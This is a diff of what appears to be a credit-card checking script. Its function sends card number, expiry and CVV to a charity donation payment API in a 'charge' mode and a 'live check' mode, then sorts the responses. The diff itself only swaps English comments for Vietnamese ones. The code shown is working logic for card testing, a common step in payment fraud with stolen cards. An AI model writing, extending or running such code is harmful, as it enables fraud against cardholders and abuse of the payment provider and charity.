@@ -1005,7 +1005,7 @@ def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
                 "brand_code": "eca",
                 "cardholder": cardholder,
                 "expiry_month": mes.zfill(2),
-                "expiry_year": ano,
+                "expiry_year": ano, # Sử dụng `ano` (đã được chuẩn hóa thành 4 chữ số)
                 "transaction_id": transaction_id
             },
             "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6",
@@ -1018,7 +1018,8 @@ def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
             payment_url = "https://api.raisenow.io/payments" # Charge endpoint
             payment_payload = base_payload.copy()
             payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
-            # Remove subscription part for charge mode
+            
+            # Xóa key "subscription" nếu có (để đảm bảo)
             payment_payload.pop("subscription", None)
 
             payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
@@ -1034,7 +1035,7 @@ def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
             elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
             else: return 'unknown', line, response_text, bin_info
         
-        # --- LIVE CHECK MODE (ORIGINAL LOGIC) ---
+        # --- LIVE CHECK MODE ---
         else:
             payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
             payment_payload = base_payload.copy()
